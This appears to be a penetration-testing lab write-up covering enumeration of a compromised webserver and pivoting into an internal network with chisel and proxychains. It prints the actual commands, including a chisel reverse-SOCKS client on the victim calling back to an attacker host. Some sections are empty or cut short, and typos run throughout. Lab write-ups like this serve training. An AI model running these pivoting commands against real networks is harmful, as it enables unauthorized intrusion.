Kindly Note that the test carried out in this lab environment  was a gray box test, meaning that some information was provided, and oin situations where these information were not provided, alternates methods wwould be used
e.g credentials of the compromised webserver

# PART A : Enumeration 



# PART B - Enumerating the Compromised webserver to Pivoting into the internal network 
Tools used in this section includes
   a. ssh for remote access to the compromised server
   b. curl: to access the websiite on the webserver
   c. chisel: 
   d. proxychains: To help 
   d. xfred

## Enumeration
This is the act of getting information from a target, and in this environment, an active recon was done
1. The webserver was accessed using the credentials (compromisd or provided) via ssh from the external network
   ssh ah01crt@192.168.10.247

![image](https://github.com/user-attachments/assets/61aa8f9f-6424-4b18-a29f-2568cd4f5c11)

2. The network interfaces of the compromised webserver was  enumerated and it provided an additional network interface that connects to the internal network
![image](https://github.com/user-attachments/assets/508cc111-95d0-4a37-bf0b-2654a58ba743)

3. The newly found interface was then enumerated:
     a. using the command arp - a, the IP addresss 10.10.10.2, 10.10.10.21 were discovered
   ![image](https://github.com/user-attachments/assets/ba65af0f-7578-4bc4-a9cc-0ea183d5ea1e)
      b. using the command fping  -agq 10.10.10.0/24, only 10.10.10.2 was newly discovered; the tool did not discover 10.10.10.21
   ![image](https://github.com/user-attachments/assets/3eb64036-30d6-4237-8253-a34bc0016d24)
      c. 
4. The hosts were then enumerated individually
     a. 10.10.10.22 host: using nmap -sT 10.10.10.2 -Pn, the result returned a couple of ports (53 -domain, 135 - SMB, 636- ldapssl, and oothers) which giives an indication tat 
   ![image](https://github.com/user-attachments/assets/3277b9f2-50d1-433a-8527-04233a4ce241)

   b. 10.10.10.21 host: using nmap -sT 10.10.10.21 -Pn. This returned port 135 -msrpc, 3389 -ms-wbt-server, this confirms that this is a windows machine and it is running a remote desktop

   ![image](https://github.com/user-attachments/assets/a55df725-3306-4c50-9df1-0a2b8721f1ce)

## Pivoting

Pivoting is the act of moving through different sections of  netwworks. in this environment, pivoting worked by using the attacker's machine on 192.168.10.42 to connecct to internal services running on 10.10.10.21 via the compromised server running on 192.168.10.247 and 10.10.10.17

A tool called chisel  in combination with proxychains were used here.
1. Sending the chisel tool to the compromisedd web server: This was done using the command "scp chisel ah01crt@192.168.10.247:/tmp
![image](https://github.com/user-attachments/assets/af642470-46e9-4e7a-8339-edebeca10a3d)

2. Running Chisel: After chisel hass been sent to the tmp direectory on the compromised web server, the tool was started on both the attaer machine and the compromised server
         a. Attacker machine:chisel server --socks5 --reverse 
![image](https://github.com/user-attachments/assets/4f68d466-73f3-4302-aeb4-b45da1e8daa5)
         b. on the victim machine:  ./chisel client --fingerprint pqh2eK8bDpDPiMPeTx8dAd+N0/lF9cVxo5ZoVwz8yRs= 192.168.10.42:8080 R:socks
![image](https://github.com/user-attachments/assets/8e1eb033-e00b-4636-ba96-2a6f61056be7)

3. Confirming chisel's workings: To confirm that the tool is working and we can indeed connct to the internal network,
         a. connecting to the compromised webserver via SSH using thee internal network of the server: using the command  proxychains ssh ah01crt@10.10.10.17
   This worked and it is a prove that we can connect to the internal network
   ![image](https://github.com/user-attachments/assets/e281081b-f397-4985-85a8-336b885ca95e)
         b. Connecting to the webserver's website via the internal Ip: using the command  proxychains curl 10.10.10.17  
   ![image](https://github.com/user-attachments/assets/90d02adc-8822-4ee4-85ea-2234099a6504)

4. Accessing services on the 10.10.10.21 host: Since this host runs a remote desktop service, the service was tried 




![image](https://github.com/user-attachments/assets/b455f8c4-8379-4db3-9f56-9f7258aa96f2)

